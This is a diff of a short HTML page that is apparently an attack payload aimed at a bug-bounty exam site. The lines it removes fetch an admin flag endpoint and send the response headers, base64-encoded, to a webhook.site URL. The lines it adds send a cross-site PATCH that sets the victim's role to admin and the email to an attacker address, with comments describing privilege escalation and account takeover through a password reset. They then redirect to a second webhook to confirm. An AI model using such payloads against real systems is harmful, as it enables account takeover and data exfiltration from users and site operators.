@@ -1,11 +1,22 @@
 <html>
   <body>
-    <h1>Nothing to see here...</h1>
-   <script>
-  fetch('/api/admin/flag').then(r => {
-    let h = ""; r.headers.forEach((v,k) => h += k+":"+v+";");
-    fetch('https://webhook.site/d8e80371-c06c-4048-b26f-aeeb548c0fa0?headers=' + btoa(h));
-  });
-</script>
+    <script>
+      fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
+        method: "PATCH",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        // We add the 'role' field here to try and escalate to admin
+        // or change the email to one we control to trigger a password reset
+        body: JSON.stringify({
+          "fullName": "Pwned_Admin",
+          "email": "rundlady@gongjua.com", 
+          "role": "admin" 
+        })
+      }).then(response => {
+        // Redirect to your webhook so you know the bot executed it
+        window.location = "https://webhook.site/107adc74-8f86-4c01-95dd-647268c9c6a8?status=pwned";
+      });
+    </script>
   </body>
 </html>
